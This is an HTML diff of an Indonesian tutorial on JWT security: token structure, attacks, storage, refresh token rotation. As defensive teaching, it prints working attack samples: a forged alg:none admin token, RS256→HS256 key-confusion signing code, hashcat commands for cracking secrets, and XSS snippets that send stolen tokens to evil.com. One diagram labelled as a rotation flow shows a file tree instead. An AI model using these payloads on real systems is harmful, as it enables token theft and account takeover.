@@ -1,0 +1,1016 @@
+<!-- ========== SEARCH OVERLAY ========== -->
+  <div class="search-overlay" id="searchOverlay">
+    <button class="search-close-btn" aria-label="Tutup pencarian">&times;</button>
+    <div class="search-box">
+      <div class="search-input-wrapper">
+        <input type="text" id="searchInput" placeholder="Ketik untuk mencari tutorial..." aria-label="Cari tutorial" autocomplete="off">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </div>
+      <div class="search-results" id="searchResults">
+        <div class="search-hint">Ketik untuk mencari</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== ARTICLE HERO ========== -->
+  <section class="article-hero">
+    <div class="container">
+      <div class="breadcrumb">
+        <a href="../index.html">Beranda</a>
+        <span class="separator">/</span>
+        <a href="../index.html#categories">Keamanan</a>
+        <span class="separator">/</span>
+        <span class="current">JWT Security</span>
+      </div>
+      <span class="category-tag">Keamanan</span>
+      <h1>JWT Security: Best Practices untuk Keamanan Token</h1>
+      <p class="article-subtitle">Panduan lengkap tentang keamanan JSON Web Token (JWT) — mulai dari struktur token, jenis-jenis serangan terhadap JWT, cara penyimpanan yang aman, token rotation, hingga best practices untuk membangun sistem autentikasi yang robust</p>
+      <div class="article-meta">
+        <span>📅 26 Juni 2026</span>
+        <span>📖 18 menit baca</span>
+        <span class="difficulty menengah">Menengah</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== AD SLOT ========== -->
+  <div class="container">
+    <div class="ad-slot ad-slot-wide">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+  </div>
+
+  <!-- ========== ARTICLE CONTENT ========== -->
+  <article class="article-content" id="main-content">
+    <div class="container">
+
+      <!-- TABLE OF CONTENTS -->
+      <div class="info-box info">
+        <div class="info-box-title">📋 Daftar Isi</div>
+        <ol>
+          <li><a href="#pengenalan-jwt">Pengenalan JWT</a></li>
+          <li><a href="#struktur-token">Struktur Token JWT</a></li>
+          <li><a href="#serangan-jwt">Serangan-Serangan terhadap JWT</a></li>
+          <li><a href="#penyimpanan-token">Penyimpanan Token yang Aman</a></li>
+          <li><a href="#token-rotation">Token Rotation dan Refresh Token</a></li>
+          <li><a href="#implementasi">Implementasi Aman</a></li>
+          <li><a href="#best-practices">Best Practices Lengkap</a></li>
+          <li><a href="#quiz">Quiz Pemahaman</a></li>
+        </ol>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 1: Pengenalan JWT      -->
+      <!-- ============================== -->
+      <h2 id="pengenalan-jwt">1. Pengenalan JWT</h2>
+
+      <p><strong>JSON Web Token (JWT)</strong> adalah standar terbuka (RFC 7519) yang mendefinisikan cara kompak dan mandiri untuk mengirimkan informasi antara dua pihak dalam bentuk objek JSON yang ditandatangani secara digital. JWT banyak digunakan dalam autentikasi dan otorisasi pada aplikasi web modern, terutama pada arsitektur RESTful API dan Single Page Application (SPA).</p>
+
+      <p>Berbeda dengan session-based authentication yang menyimpan state di server, JWT bersifat <strong>stateless</strong> — semua informasi yang dibutuhkan untuk autentikasi tersimpan di dalam token itu sendiri. Ini membuat JWT sangat cocok untuk arsitektur terdistribusi dan microservices.</p>
+
+      <h3>Mengapa JWT Populer?</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Kelebihan</th>
+            <th>Penjelasan</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Stateless</td><td>Tidak perlu menyimpan session di server — semua info ada di token</td></tr>
+          <tr><td>Cross-Domain</td><td>Bisa digunakan lintas domain dan layanan (CORS-friendly)</td></tr>
+          <tr><td>Self-Contained</td><td>Token membawa payload yang cukup untuk autentikasi dan otorisasi</td></tr>
+          <tr><td>Decentralized</td><td>Setiap service bisa memverifikasi token secara mandiri tanpa ke central auth server</td></tr>
+          <tr><td>Mobile-Friendly</td><td>Ringan dan mudah dikirim via HTTP header, cocok untuk mobile apps</td></tr>
+          <tr><td>Standar Terbuka</td><td>Didukung luas oleh library dan framework di berbagai bahasa pemrograman</td></tr>
+        </tbody>
+      </table>
+
+      <h3>JWT vs Session Cookies vs API Keys</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Aspek</th>
+            <th>JWT</th>
+            <th>Session Cookie</th>
+            <th>API Key</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>State</td><td>Stateless</td><td>Stateful (server-side)</td><td>Stateless</td></tr>
+          <tr><td>Skalabilitas</td><td>Tinggi (no shared state)</td><td>Butuh shared session store</td><td>Tinggi</td></tr>
+          <tr><td>Granularitas</td><td>Bisa bawa payload kustom</td><td>Hanya session ID</td><td>Hanya identifier</td></tr>
+          <tr><td>Revocation</td><td>Sulit (butuh blocklist)</td><td>Mudah (hapus session)</td><td>Bisa (invalidate key)</td></tr>
+          <tr><td>Keamanan</td><td>Perlu penanganan khusus</td><td>Built-in browser protection</td><td>Sederhana tapi kurang aman</td></tr>
+          <tr><td>Use Case</td><td>API, SPA, microservices</td><td>Traditional web app</td><td>Service-to-service</td></tr>
+        </tbody>
+      </table>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Diagram: JWT Authentication Flow</div>
+<pre class="mermaid">
+flowchart TD
+    N0["Client (Browser/App)"]
+    N1["Auth Server (Login/Register)"]
+    N2["API Server (Protected)"]
+    N3["(4) Verifikasi"]
+    N4["Verify signature"]
+    N5["Decode payload"]
+    N6["Check expiry"]
+    N7["Validate claims"]
+    N8["Proses tanpa query database — server verifikasi..."]
+    N0 --> N1
+    N1 --> N2
+    N2 --> N3
+    N3 --> N4
+    N4 --> N5
+    N5 --> N6
+    N6 --> N7
+    N7 --> N8
+</pre>
+    </div>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 2: Struktur Token      -->
+      <!-- ============================== -->
+      <h2 id="struktur-token">2. Struktur Token JWT</h2>
+
+      <p>JWT terdiri dari tiga bagian yang dipisahkan oleh titik (.): <strong>Header</strong>, <strong>Payload</strong>, dan <strong>Signature</strong>. Setiap bagian di-encode menggunakan Base64URL encoding.</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Diagram: JWT Token Structure</div>
+<pre class="mermaid">
+flowchart TD
+    N0["HEADER Base64URL alg: HS256 ."]
+    N1["PAYLOAD Base64URL sub, exp, iat, ... ."]
+    N2["SIGNATURE HMAC SHA256 header+payload+secret"]
+    N0 --> N1
+    N1 --> N2
+</pre>
+    </div>
+      </div>
+
+      <h3>Header</h3>
+      <p>Header mendefinisikan metadata token, termasuk algoritma signing yang digunakan dan tipe token.</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Contoh: JWT Header</div>
+<pre><code>
+// Header JWT (decoded dari Base64URL)
+{
+  "alg": "HS256",    // Algoritma signing: HS256, RS256, ES256, dll
+  "typ": "JWT"       // Tipe token
+}
+
+// ============================================
+// Algoritma Signing yang Didukung
+// ============================================
+
+// HMAC (symmetric — satu key untuk sign dan verify)
+HS256  →  HMAC-SHA256  (256-bit)  ← Paling umum
+HS384  →  HMAC-SHA384  (384-bit)
+HS512  →  HMAC-SHA512  (512-bit)
+
+// RSA (asymmetric — public key untuk verify, private key untuk sign)
+RS256  →  RSASSA-PKCS1-v1_5 + SHA-256
+RS384  →  RSASSA-PKCS1-v1_5 + SHA-384
+RS512  →  RSASSA-PKCS1-v1_5 + SHA-512
+
+// ECDSA (asymmetric — lebih cepat dari RSA, key lebih kecil)
+ES256  →  ECDSA P-256 + SHA-256
+ES384  →  ECDSA P-384 + SHA-384
+
+// EdDSA (modern — menggunakan Ed25519/Ed448)
+EdDSA  →  Ed25519 atau Ed448
+
+// ⚠️ "alg": "none" — TIDAK ADA SIGNATURE (sangat berbahaya!)
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+// Ini artinya token TIDAK ditandatangani dan BISA dimanipulasi!
+</code></pre>
+      </div>
+
+      <h3>Payload (Claims)</h3>
+      <p>Payload berisi <strong>claims</strong> — pernyataan tentang entitas (biasanya user) dan metadata tambahan. Ada tiga jenis claims:</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Contoh: JWT Payload</div>
+<pre><code>
+// Payload JWT (decoded dari Base64URL)
+{
+  // ===== REGISTERED CLAIMS (standar RFC 7519) =====
+  "iss": "https://auth.example.com",  // Issuer — siapa yang menerbitkan token
+  "sub": "user123456",                  // Subject — siapa yang dimaksud
+  "aud": "https://api.example.com",    // Audience — siapa yang dituju
+  "exp": 1719432000,                   // Expiration — kapan token kedaluwarsa (Unix timestamp)
+  "nbf": 1719428400,                   // Not Before — token tidak valid sebelum waktu ini
+  "iat": 1719428400,                   // Issued At — kapan token diterbitkan
+  "jti": "unique-token-id-123",        // JWT ID — identifier unik untuk token
+
+  // ===== PUBLIC CLAIMS (custom tapi harus terdaftar di IANA) =====
+  "name": "John Doe",
+  "email": "john@example.com",
+  "picture": "https://example.com/photo.jpg",
+
+  // ===== PRIVATE CLAIMS (custom, kesepakatan antar pihak) =====
+  "role": "admin",
+  "permissions": ["read", "write", "delete"],
+  "org_id": "org_abc123",
+  "plan": "premium"
+}
+
+// ⚠️ PENTING: Payload TIDAK DIENKRIPSI!
+// Payload hanya di-encode Base64URL, SIAPAPUN bisa membacanya.
+// JANGAN simpan data sensitif di payload (password, API keys, dll.)
+</code></pre>
+      </div>
+
+      <h3>Signature</h3>
+      <p>Signature adalah bagian yang menjamin <strong>integritas</strong> dan <strong>autentisitas</strong> token. Signature dibuat dengan meng-encode header dan payload, lalu menandatanganinya dengan secret key.</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Contoh: Pembuatan Signature</div>
+<pre><code>
+// Proses pembuatan signature HS256:
+// signature = HMACSHA256(
+//   base64UrlEncode(header) + "." + base64UrlEncode(payload),
+//   secret_key
+// )
+
+// Dalam kode (Node.js):
+const crypto = require('crypto');
+
+const header = Buffer.from(JSON.stringify({alg: 'HS256', typ: 'JWT'})).toString('base64url');
+const payload = Buffer.from(JSON.stringify({sub: 'user123', iat: Date.now()})).toString('base64url');
+const secret = 'your-256-bit-secret-key-here!';
+
+const signature = crypto.createHmac('sha256', secret)
+  .update(`${header}.${payload}`)
+  .digest('base64url');
+
+const token = `${header}.${payload}.${signature}`;
+// Result: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiw...
+
+// ============================================
+// Verifikasi signature:
+// ============================================
+const [h, p, s] = token.split('.');
+const expectedSig = crypto.createHmac('sha256', secret)
+  .update(`${h}.${p}`)
+  .digest('base64url');
+
+if (s === expectedSig) {
+  console.log('Token VALID ✅');
+} else {
+  console.log('Token INVALID atau DIMANIPULASI ❌');
+}
+</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 3: Serangan JWT        -->
+      <!-- ============================== -->
+      <h2 id="serangan-jwt">3. Serangan-Serangan terhadap JWT</h2>
+
+      <p>Memahami serangan terhadap JWT sangat penting untuk membangun sistem autentikasi yang aman. Berikut adalah serangan-serangan paling umum dan cara mencegahnya.</p>
+
+      <h3>3.1 Algorithm Confusion Attack (alg:none)</h3>
+      <p>Serangan ini memanfaatkan fakta bahwa beberapa library JWT mempercayai field <code>alg</code> di header tanpa verifikasi. Attacker mengubah <code>alg</code> menjadi <code>"none"</code> dan menghapus signature — sehingga token tanpa signature diterima sebagai valid.</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Serangan: Algorithm Confusion</div>
+<pre><code>
+# ============================================
+# Serangan alg:none
+# ============================================
+
+# Token asli (dengan signature):
+# Header:  {"alg": "HS256", "typ": "JWT"}
+# Payload: {"sub": "user123", "role": "user"}
+# Signature: valid_signature_here
+
+# Token yang dimanipulasi attacker:
+# Header:  {"alg": "none", "typ": "JWT"}
+# Payload: {"sub": "admin", "role": "admin"}  ← diubah!
+# Signature: (kosong — dihapus)
+
+# Token manipulasi:
+# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+
+# Jika server tidak memvalidasi algoritma dengan benar,
+# token ini akan diterima! 😱
+
+# ============================================
+# Pencegahan:
+# ============================================
+# 1. JANGAN pernah izinkan alg "none"
+# 2. Whitelist algoritma yang diizinkan
+# 3. Gunakan library yang terpercaya
+
+# Contoh di jsonwebtoken (Node.js):
+const jwt = require('jsonwebtoken');
+
+// ❌ BERBAHAYA — mempercayai alg dari token
+jwt.verify(token, secretOrPublicKey);
+
+// ✅ AMAN — tentukan algoritma yang diizinkan
+jwt.verify(token, secretOrPublicKey, {
+  algorithms: ['HS256']  // Hanya izinkan HS256
+});
+</code></pre>
+      </div>
+
+      <h3>3.2 RS256 to HS256 Confusion Attack</h3>
+      <p>Serangan ini terjadi ketika server menggunakan <strong>RS256</strong> (asymmetric) tetapi attacker mengubah algoritma ke <strong>HS256</strong> (symmetric). Karena pada HS256 key yang sama digunakan untuk sign dan verify, attacker bisa menggunakan <strong>public key</strong> server sebagai secret key untuk membuat token palsu.</p>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Serangan: RS256 → HS256 Confusion</div>
+<pre><code>
+# ============================================
+# Serangan Algorithm Confusion (RS256 → HS256)
+# ============================================
+
+# Skenario:
+# - Server menggunakan RS256 (asymmetric)
+# - Public key server tersedia publik (standar untuk RS256)
+# - Server mempercayai field "alg" di token
+
+# Serangan:
+# 1. Attacker mendapatkan public key server (pub.pem)
+# 2. Mengubah header: {"alg": "HS256"}  ← dari RS256
+# 3. Mengubah payload: {"sub": "admin", "role": "admin"}
+# 4. Sign menggunakan HMAC dengan public key sebagai secret
+
+# Kode serangan:
+const crypto = require('crypto');
+const publicKey = fs.readFileSync('pub.pem'); // Public key server
+
+const header = { alg: 'HS256', typ: 'JWT' };
+const payload = { sub: 'admin', role: 'admin' };
+
+const h = base64url(JSON.stringify(header));
+const p = base64url(JSON.stringify(payload));
+
+// Gunakan public key sebagai HMAC secret!
+const signature = crypto.createHmac('sha256', publicKey)
+  .update(`${h}.${p}`)
+  .digest('base64url');
+
+// Server akan memverifikasi menggunakan HMAC dengan public key
+// → Verifikasi BERHASIL! Token palsu diterima! 😱
+
+# ============================================
+# Pencegahan:
+# ============================================
+# 1. SELALU tentukan algoritma yang diizinkan secara eksplisit
+# 2. Jangan izinkan perubahan algoritma dari token
+
+// ✅ PENCEGAHAN:
+jwt.verify(token, publicKey, {
+  algorithms: ['RS256']  // HANYA RS256, tidak boleh HS256
+});
+</code></pre>
+      </div>
+
+      <h3>3.3 Brute Force Secret Key</h3>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Serangan: Brute Force HMAC Secret</div>
+<pre><code>
+# ============================================
+# Brute Force JWT Secret Key
+# ============================================
+# Tool: hashcat, john the ripper
+
+# Hashcat untuk brute force HS256:
+# Format hash untuk hashcat: JWT token langsung
+hashcat -m 16500 jwt.txt wordlist.txt
+
+# John the Ripper:
+john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
+
+# Tool khusus: jwt_tool
+python3 jwt_tool.py eyJhbG... -C -d wordlist.txt
+
+# ============================================
+# Pencegahan:
+# ============================================
+# 1. Gunakan secret key yang SANGAT PANJANG (minimum 256-bit/32 byte)
+# 2. Gunakan karakter random yang kuat
+# 3. Rotasi secret key secara berkala
+# 4. Pertimbangkan RS256 (asymmetric) — tidak bisa di-brute force
+
+# Generate secure secret:
+openssl rand -base64 32
+# Output: xK7mN9pQ2rT5vW8yB3dF6gH0jL4nP7sU1xA4cE9hK2m
+
+# ❌ SECRET LEMAH:
+JWT_SECRET = "secret123"
+JWT_SECRET = "mysecret"
+JWT_SECRET = "password"
+
+# ✅ SECRET KUAT:
+JWT_SECRET = "xK7mN9pQ2rT5vW8yB3dF6gH0jL4nP7sU1xA4cE9hK2mQ6tW0zC3fH5kN8p"
+</code></pre>
+      </div>
+
+      <h3>3.4 JWT Token Leaked via URL/Referrer</h3>
+
+      <div class="info-box warning">
+        <div class="info-box-title">⚠️ Token Leakage Risiko</div>
+        <ul>
+          <li>Jangan pernah mengirim JWT di URL query string (<code>?token=eyJ...</code>) — token akan terekam di browser history, server logs, dan Referrer header</li>
+          <li>Simpan JWT di <code>Authorization</code> header, bukan di URL</li>
+          <li>Gunakan <code>Referrer-Policy: no-referrer</code> untuk mencegah token bocor ke situs lain</li>
+          <li>Hindari logging JWT di server logs</li>
+        </ul>
+      </div>
+
+      <h3>3.5 Cross-Site Scripting (XSS) JWT Theft</h3>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Serangan: XSS → JWT Theft</div>
+<pre><code>
+# ============================================
+# XSS untuk mencuri JWT dari localStorage
+# ============================================
+
+# Jika attacker berhasil menyuntikkan XSS:
+&lt;script&gt;
+  // Curi JWT dari localStorage
+  const token = localStorage.getItem('jwt_token');
+  
+  // Kirim ke server attacker
+  fetch('https://evil.com/collect', {
+    method: 'POST',
+    body: JSON.stringify({ token: token }),
+    headers: {'Content-Type': 'application/json'}
+  });
+&lt;/script&gt;
+
+# Atau dari sessionStorage:
+&lt;script&gt;
+  const token = sessionStorage.getItem('jwt_token');
+  new Image().src = 'https://evil.com/collect?token=' + token;
+&lt;/script&gt;
+
+# ============================================
+# Pencegahan:
+# ============================================
+# 1. Gunakan httpOnly cookies (tidak bisa diakses JavaScript)
+# 2. Implementasikan CSP untuk mencegah XSS
+# 3. Input validation dan output encoding
+# 4. Short-lived token + refresh token rotation
+# 5. Bind token ke device fingerprint
+</code></pre>
+      </div>
+
+      <h3>3.6 Replay Attack</h3>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Serangan: Token Replay</div>
+<pre><code>
+# ============================================
+# Replay Attack — Token yang dicuri digunakan ulang
+# ============================================
+
+# Skenario:
+# 1. Attacker mendapatkan JWT user (via XSS, MITM, atau packet sniffing)
+# 2. Attacker menggunakan token tersebut untuk mengakses API
+#    sebagai user yang sah
+
+# Contoh request dengan token curian:
+curl -X GET https://api.example.com/user/profile \
+  -H "Authorization: Bearer eyJhbG...token_curiandari_user..."
+
+# Response: Data user berhasil diakses oleh attacker! 😱
+
+# ============================================
+# Pencegahan:
+# ============================================
+# 1. Token expiry yang SINGKAT (15 menit untuk access token)
+# 2. Token rotation — refresh token harus dirotasi
+# 3. Token binding — hubungkan token dengan IP/fingerprint
+# 4. Revoke mechanism — blocklist untuk token yang dikompromikan
+# 5. Jti (JWT ID) + server-side tracking untuk one-time-use
+
+# Contoh token binding dengan fingerprint:
+{
+  "sub": "user123",
+  "fingerprint": "abc123hash",  // Hash dari User-Agent + IP + device ID
+  "exp": 1719432000
+}
+
+# Server memverifikasi fingerprint:
+if (hash(request.userAgent + request.ip) !== token.fingerprint) {
+  return 401;  // Token kemungkinan dicuri
+}
+</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 4: Penyimpanan Token   -->
+      <!-- ============================== -->
+      <h2 id="penyimpanan-token">4. Penyimpanan Token yang Aman</h2>
+
+      <p>Di mana Anda menyimpan JWT sangat mempengaruhi keamanan sistem autentikasi. Setiap opsi penyimpanan memiliki trade-off antara keamanan dan kemudahan implementasi.</p>
+
+      <h3>Perbandingan Metode Penyimpanan</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Metode</th>
+            <th>XSS Risk</th>
+            <th>CSRF Risk</th>
+            <th>Rekomendasi</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>localStorage</td><td>🔴 Tinggi</td><td>🟢 Rendah</td><td>❌ Tidak direkomendasikan</td></tr>
+          <tr><td>sessionStorage</td><td>🔴 Tinggi</td><td>🟢 Rendah</td><td>❌ Tidak direkomendasikan</td></tr>
+          <tr><td>httpOnly Cookie</td><td>🟢 Rendah</td><td>🟡 Sedang</td><td>✅ Direkomendasikan</td></tr>
+          <tr><td>In-memory Variable</td><td>🟡 Sedang</td><td>🟢 Rendah</td><td>✅ Paling aman (SPA)</td></tr>
+          <tr><td>Service Worker</td><td>🟢 Rendah</td><td>🟢 Rendah</td><td>✅ Advanced (PWA)</td></tr>
+        </tbody>
+      </table>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Contoh: Implementasi Setiap Metode</div>
+<pre><code>
+# ============================================
+# 1. localStorage — TIDAK DIREKOMENDASIKAN
+# ============================================
+// ❌ Rentan XSS — bisa diakses oleh semua JavaScript di halaman
+localStorage.setItem('jwt_token', token);
+const token = localStorage.getItem('jwt_token');
+
+// Masalah:
+// - Semua script di halaman (termasuk yang disuntikkan XSS) bisa akses
+// - Data persist bahkan setelah browser ditutup
+// - Tidak ada expiry otomatis
+
+# ============================================
+# 2. httpOnly Cookie — DIREKOMENDASIKAN
+# ============================================
+// ✅ Tidak bisa diakses oleh JavaScript
+// Server set cookie:
+res.cookie('access_token', token, {
+  httpOnly: true,      // Tidak bisa diakses JS (anti-XSS)
+  secure: true,        // Hanya dikirim via HTTPS
+  sameSite: 'Strict',  // Tidak dikirim dalam cross-site request (anti-CSRF)
+  maxAge: 15 * 60 * 1000,  // 15 menit
+  path: '/',
+  domain: '.example.com'
+});
+
+// Cookie otomatis dikirim di setiap request ke domain yang sama
+// Frontend tidak perlu menambahkan header Authorization manual
+
+// ⚠️ Perlu CSRF protection karena cookie dikirim otomatis
+// Tambahkan anti-CSRF token di header untuk setiap request
+
+# ============================================
+# 3. In-Memory Storage — PALING AMAN untuk SPA
+# ============================================
+// ✅ Tidak tersimpan di storage manapun
+// ❌ Hilang saat page refresh (perlu silent refresh)
+
+class TokenService {
+  #accessToken = null;  // Private field
+  
+  setToken(token) {
+    this.#accessToken = token;
+  }
+  
+  getToken() {
+    return this.#accessToken;
+  }
+  
+  clearToken() {
+    this.#accessToken = null;
+  }
+  
+  isAuthenticated() {
+    return this.#accessToken !== null;
+  }
+}
+
+const tokenService = new TokenService();
+
+// Setelah login:
+tokenService.setToken(response.data.accessToken);
+
+// Untuk request API:
+axios.interceptors.request.use(config => {
+  const token = tokenService.getToken();
+  if (token) {
+    config.headers.Authorization = `Bearer ${token}`;
+  }
+  return config;
+});
+
+# ============================================
+# 4. Hybrid Approach (Recommended untuk Production)
+# ============================================
+// Access Token  → In-memory (hilang saat refresh)
+// Refresh Token → httpOnly cookie (persist, aman dari XSS)
+
+// Saat page refresh:
+// 1. Cek apakah access token masih ada di memory
+// 2. Jika tidak → gunakan refresh token (cookie) untuk dapat access token baru
+// 3. Simpan access token baru di memory
+
+async function silentRefresh() {
+  try {
+    const response = await fetch('/auth/refresh', {
+      method: 'POST',
+      credentials: 'include'  // Kirim httpOnly cookie
+    });
+    const data = await response.json();
+    tokenService.setToken(data.accessToken);
+    return true;
+  } catch (err) {
+    // Refresh token expired/invalid → redirect ke login
+    window.location.href = '/login';
+    return false;
+  }
+}
+</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 5: Token Rotation      -->
+      <!-- ============================== -->
+      <h2 id="token-rotation">5. Token Rotation dan Refresh Token</h2>
+
+      <p>Token rotation adalah strategi keamanan di mana <strong>refresh token dirotasi setiap kali digunakan</strong>. Ini memastikan bahwa jika sebuah refresh token dicuri, token lama akan langsung invalid ketika token baru digunakan.</p>
+
+      <h3>Access Token vs Refresh Token</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Aspek</th>
+            <th>Access Token</th>
+            <th>Refresh Token</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Tujuan</td><td>Mengakses protected resources</td><td>Mendapatkan access token baru</td></tr>
+          <tr><td>Expiry</td><td>Pendek (5-15 menit)</td><td>Panjang (7-30 hari)</td></tr>
+          <tr><td>Storage</td><td>In-memory / Authorization header</td><td>httpOnly Cookie</td></tr>
+          <tr><td>Dikirim ke</td><td>API server</td><td>Auth server saja</td></tr>
+          <tr><td>Payload</td><td>Berisi user info, permissions</td><td>Hanya identifier + expiry</td></tr>
+          <tr><td>Rotation</td><td>Tidak perlu (expired cepat)</td><td>Setiap kali digunakan</td></tr>
+        </tbody>
+      </table>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Diagram: Token Rotation Flow</div>
+<pre class="mermaid">
+flowchart TD
+    N0["jwt-auth-project/"]
+    N1[server.js]
+    N2[auth.js]
+    N3[middleware.js]
+    N4[.env]
+    N5[package.json]
+    N0 --> N1
+</pre>
+    </div>
+      </div>
+
+      <div class="diagram-box">
+        <div class="diagram-label">Contoh: Implementasi Token Rotation</div>
+<pre><code>
+# ============================================
+# Server-side: Refresh Token Rotation
+# ============================================
+
+// Database model untuk refresh tokens
+// RefreshToken {
+//   id, user_id, token_hash, family_id,
+//   expires_at, revoked, created_at
+// }
+
+const crypto = require('crypto');
+const jwt = require('jsonwebtoken');
+
+// Login endpoint
+app.post('/auth/login', async (req, res) =&gt; {
+  const { email, password } = req.body;
+  const user = await verifyCredentials(email, password);
+  
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+  
+  // Generate token pair
+  const familyId = crypto.randomUUID();
+  const tokens = generateTokenPair(user, familyId);
+  
+  // Simpan refresh token hash di database
+  await db.refreshTokens.create({
+    user_id: user.id,
+    token_hash: hashToken(tokens.refreshToken),
+    family_id: familyId,
+    expires_at: tokens.refreshExpiresAt,
+    revoked: false
+  });
+  
+  // Set refresh token sebagai httpOnly cookie
+  res.cookie('refresh_token', tokens.refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'Strict',
+    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 hari
+  });
+  
+  // Return access token
+  res.json({ accessToken: tokens.accessToken });
+});
+
+// Refresh endpoint
+app.post('/auth/refresh', async (req, res) =&gt; {
+  const refreshToken = req.cookies.refresh_token;
+  
+  if (!refreshToken) {
+    return res.status(401).json({ error: 'No refresh token' });
+  }
+  
+  // Cari token di database
+  const storedToken = await db.refreshTokens.findOne({
+    token_hash: hashToken(refreshToken)
+  });
+  
+  // DETEKSI TOKEN REUSE — indikasi token dicuri!
+  if (!storedToken || storedToken.revoked) {
+    if (storedToken &amp;&amp; storedToken.revoked) {
+      // Token sudah di-revoke tapi masih digunakan!
+      // Kemungkinan token dicuri — REVOKE SELURUH FAMILY
+      await db.refreshTokens.updateMany(
+        { family_id: storedToken.family_id },
+        { revoked: true }
+      );
+      console.warn(`[SECURITY] Token reuse detected for user ${storedToken.user_id}`);
+    }
+    return res.status(401).json({ error: 'Invalid refresh token' });
+  }
+  
+  // Verify expiry
+  if (new Date() &gt; storedToken.expires_at) {
+    return res.status(401).json({ error: 'Refresh token expired' });
+  }
+  
+  // REVOKE token lama
+  await db.refreshTokens.update(
+    { id: storedToken.id },
+    { revoked: true }
+  );
+  
+  // Generate token BARU dengan family yang sama
+  const user = await db.users.findById(storedToken.user_id);
+  const tokens = generateTokenPair(user, storedToken.family_id);
+  
+  // Simpan token baru
+  await db.refreshTokens.create({
+    user_id: user.id,
+    token_hash: hashToken(tokens.refreshToken),
+    family_id: storedToken.family_id,
+    expires_at: tokens.refreshExpiresAt,
+    revoked: false
+  });
+  
+  res.cookie('refresh_token', tokens.refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'Strict',
+    maxAge: 7 * 24 * 60 * 60 * 1000
+  });
+  
+  res.json({ accessToken: tokens.accessToken });
+});
+
+// Helper functions
+function generateTokenPair(user, familyId) {
+  const accessToken = jwt.sign(
+    { sub: user.id, role: user.role },
+    process.env.JWT_SECRET,
+    { expiresIn: '15m', algorithm: 'HS256' }
+  );
+  
+  const refreshToken = crypto.randomBytes(40).toString('hex');
+  const refreshExpiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
+  
+  return { accessToken, refreshToken, refreshExpiresAt };
+}
+
+function hashToken(token) {
+  return crypto.createHash('sha256').update(token).digest('hex');
+}
+</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 6: Implementasi        -->
+      <!-- ============================== -->
+      <h2 id="implementasi">6. Implementasi JWT yang Aman</h2>
+
+      <h3>Pemilihan Algoritma</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Algoritma</th>
+            <th>Tipe</th>
+            <th>Keamanan</th>
+            <th>Kapan Digunakan</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>HS256</td><td>Symmetric</td><td>Baik (jika secret kuat)</td><td>Single service, same team yang kontrol server dan client</td></tr>
+          <tr><td>RS256</td><td>Asymmetric</td><td>Sangat baik</td><td>Multi-service, third party perlu verifikasi token</td></tr>
+          <tr><td>ES256</td><td>Asymmetric</td><td>Sangat baik</td><td>Mobile apps (key kecil), high-performance requirements</td></tr>
+          <tr><td>EdDSA</td><td>Asymmetric</td><td>Excellent</td><td>Modern apps, kinerja tinggi, security terbaik</td></tr>
+          <tr><td>PS256</td><td>Asymmetric</td><td>Sangat baik</td><td>Enterprise, compliance requirements</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Kontrol Payload yang Aman</h3>
+
+      <div class="info-box tip">
+        <div class="info-box-title">💡 Apa yang Boleh dan Tidak Boleh di Payload JWT</div>
+        <ul>
+          <li>✅ <strong>Boleh:</strong> user ID, role, permissions, tenant ID, token expiry</li>
+          <li>❌ <strong>Tidak boleh:</strong> password, API keys, credit card numbers, secrets, PII sensitif</li>
+          <li>❌ <strong>Hindari:</strong> Data yang sering berubah (harus invalidate token)</li>
+          <li>✅ <strong>Prinsip:</strong> Payload harus minimal — hanya info yang dibutuhkan untuk otorisasi</li>
+        </ul>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 7: Best Practices      -->
+      <!-- ============================== -->
+      <h2 id="best-practices">7. Best Practices Lengkap</h2>
+
+      <div class="info-box tip">
